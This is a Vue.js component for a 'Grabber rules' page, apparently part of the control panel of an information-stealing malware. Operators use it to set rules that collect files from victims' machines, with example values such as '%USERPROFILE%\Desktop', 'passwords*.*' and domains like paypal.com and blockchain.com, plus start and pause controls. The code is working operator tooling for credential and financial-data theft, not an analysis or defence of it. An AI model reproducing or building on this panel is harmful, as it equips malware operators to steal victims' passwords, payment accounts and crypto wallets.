<template>
    <card card-body-classes="table-full-width" no-footer-line v-loading="table.isLoading">
      <h4 slot="header" class="card-title">
        Grabber rules
        <el-tooltip class="item" effect="dark" content="Create new rule" placement="top">
          <el-button  type="primary" icon="fal fa-plus-circle" size="small" circle
                      class="float-right"
                      @click="create()">
          </el-button>
        </el-tooltip>
        <el-dialog  :title="isCreateModal ? 'Create grabber rule' : 'Edit grabber rule'"
                    width="480px"
                    :visible.sync="showModal"
        >
          <el-form :model="form" style="margin-top: -30px;">
            <el-form-item label="Path" style="margin-top: -20px;">
              <el-input v-model="form.path"
                        placeholder="%USERPROFILE%\Desktop"
                        size="medium"
              ></el-input>
            </el-form-item>
            <el-form-item label="Mask" style="margin-top: -20px;">
              <el-input v-model="form.mask"
                        placeholder="passwords*.*"
                        size="medium"
              ></el-input>
            </el-form-item>
            <el-form-item label="Only with this domains" style="margin-top: -20px;">
              <el-input v-model="form.domains"
                        placeholder="paypal.com,blockchain.com,..."
                        size="medium"
                ></el-input>
            </el-form-item>
            <el-form-item label="Exception words in the file name" style="margin-top: -20px;">
              <el-input v-model="form.exeptions"
                        placeholder="vova,putin,..."
                        size="medium"
                ></el-input>
            </el-form-item>
            <el-form-item label="Max file size" style="margin-top: -10px;">
              <el-input-number v-model="form.file_size" size="medium"
              ></el-input-number>
            </el-form-item>
            <el-form-item>
              <el-checkbox v-model="form.recursive" label="Recursive (subfolders)"></el-checkbox>
              <el-checkbox v-model="form.status" label="Start after creating"></el-checkbox>
            </el-form-item>
          </el-form>
          <span slot="footer" class="dialog-footer">
            <el-button size="small" @click="showModal = false">Cancel</el-button>
            <el-button size="small" type="primary" @click="modalSubmit">Submit</el-button>
          </span>
        </el-dialog>
      </h4>
      <el-button  v-if="table.data.length < 1"
                  class="col d-flex justify-content-center"
                  type="text" @click="create()"
      >
        Create grabber rule
      </el-button>
      <div v-else>
        <el-table ref="multipleTable" :data="paginate">
          <el-table-column prop="id" label="#" min-width="50"></el-table-column>
          <el-table-column prop="path" label="Path"></el-table-column>
          <el-table-column prop="mask" label="Mask"></el-table-column>
          <el-table-column prop="domains" label="Domains"></el-table-column>
          <el-table-column prop="file_size" label="FileSize"></el-table-column>
          <el-table-column prop="recursive" label="Recursive">
            <template slot-scope="props">
              <el-tag v-if="props.row.recursive"
                      type="success"
                      size="small"
                      style="margin-top: 5px;"
              >yes</el-tag>
              <el-tag v-else
                      type="danger"
                      size="small"
                      style="margin-top: 5px;"
              >no</el-tag>
            </template>
          </el-table-column>
          <el-table-column prop="status" label="Status">
            <template slot-scope="props">
              <el-tag v-if="props.row.status"
                      type="success"
                      size="small"
                      style="margin-top: 5px;"
              >enabled</el-tag>
              <el-tag v-else
                      type="danger"
                      size="small"
                      style="margin-top: 5px;"
              >disabled</el-tag>
            </template>
          </el-table-column>
          <el-table-column label="Actions" min-width="100">
            <template slot-scope="props">
              <el-tooltip class="item" effect="dark" content="Start/stop rule" placement="top">
                <el-button :icon="props.row.status ? 'fal fa-pause':'fal fa-play'"
                            @click="start(props.row)"
                            circle
                            size="medium"
                ></el-button>
              </el-tooltip>
              <el-tooltip class="item" effect="dark" content="Edit" placement="top">
                <el-button  icon="fal fa-edit"
                            @click="edit(props.row)"
                            circle
                            size="medium"
                ></el-button>
              </el-tooltip>
              <el-tooltip class="item" effect="dark" content="Delete" placement="top">
                <el-button  icon="fal fa-trash"
                            type="danger"
                            @click="deleteRule(props.row)"
                            circle
                            size="medium"
                ></el-button>
              </el-tooltip>
            </template>
          </el-table-column>
        </el-table>
        <div slot="footer" class="col-12 d-flex justify-content-center justify-content-sm-between flex-wrap mt-3">
          <p class="text-muted">Total {{table.data.length}} rules</p>
          <pagination class="pagination-primary"
                        v-model="pagination.currentPage"
                        :per-page="pagination.perPage"
                        :total="table.data.length"/>
          <p class="text-muted">Showing {{from}}-{{to}} rules</p>
        </div>
      </div>
    </card>
</template>

<script>
import { Pagination, Card } from 'src/components';
import store from 'src/store'

export default {
   components: {
    Pagination,
    Card
  },
  data() {
    return {
      table: {
        isLoading: true,
        data: [],
      },
      pagination: {
        perPage: 10,
        currentPage: 1,
      },
      showModal: false,
      isCreateModal: true,
      form: {
        id: 0,
        path: '',
        mask: '',
        domains: '',
        file_size: 0,
        recursive: false,
        status: false,
      },
    }
  },
  async mounted() {
    this.table.isLoading = true;
    if (!this.$store.getters.GRABBER_DATA.length) {
      await this.$store.dispatch('GET_GRABBER_DATA', this.form);
    }
    this.table.data = this.$store.getters.GRABBER_DATA;
    this.table.isLoading = false;
  },
  computed: {
    from() {
      return this.pagination.perPage * (this.pagination.currentPage - 1);
    },
    to() {
      let highBound = this.from + this.pagination.perPage;
      if (this.table.data.length < highBound) {
        highBound = this.table.data.length;
      }
      return highBound;
    },
    paginate() {
      let result = this.table.data;
      if (this.table.data.length > 0) {
        result = this.table.data;
      }
      return result.slice(this.from, this.to);
    }
  },
  methods: {
    async updateData() {
      this.table.isLoading = true;
      await this.$store.dispatch('GET_GRABBER_DATA', this.form);
      this.table.data = this.$store.getters.GRABBER_DATA;
      this.table.isLoading = false;
    },
    async deleteRule(row) {
      this.form.id = row.id;
      await this.$store.dispatch('DEL_GRABBER_RULE', this.form);
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: 'Grabber rule deleted success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }

      const index = this.table.data.indexOf(row);
      if (index != -1) {
        this.table.data.splice(index, 1);
      }
    },
    edit(row) {
      this.form.id = row.id;
      this.form.path = row.path;
      this.form.mask = row.mask;
      this.form.domains = row.domains;
      this.form.file_size = row.file_size;
      this.form.recursive = row.recursive;
      this.form.status = row.status;
      this.isCreateModal = false;
      this.showModal = true;
    },
    async start(row) {
      this.form.id = row.id;
      this.form.status = row.status;
      await this.$store.dispatch('RUN_GRABBER_RULE', this.form);
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: this.form.status ? 'Rule paused success!':'Rule started success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }

      const index = this.table.data.indexOf(row);
      if (index != -1) {
        this.table.data[index].status = !this.table.data[index].status;
      }
    },
    create() {
      this.form = {};
      this.isCreateModal = true;
      this.showModal = true;
    },
    async modalSubmit() {
      this.showModal = false;
      if (this.isCreateModal)
        await this.$store.dispatch('CREATE_GRABBER_RULE', this.form);
      else
        await this.$store.dispatch('EDIT_GRABBER_RULE', this.form);
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: this.isCreateModal ? 'Rule created success!':'Rule updated success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }
      await this.updateData();
    },
  }
}
</script>

<style scoped>
.text-muted {
    color: #70657b !important;
    font-size: 12px;
}
</style>
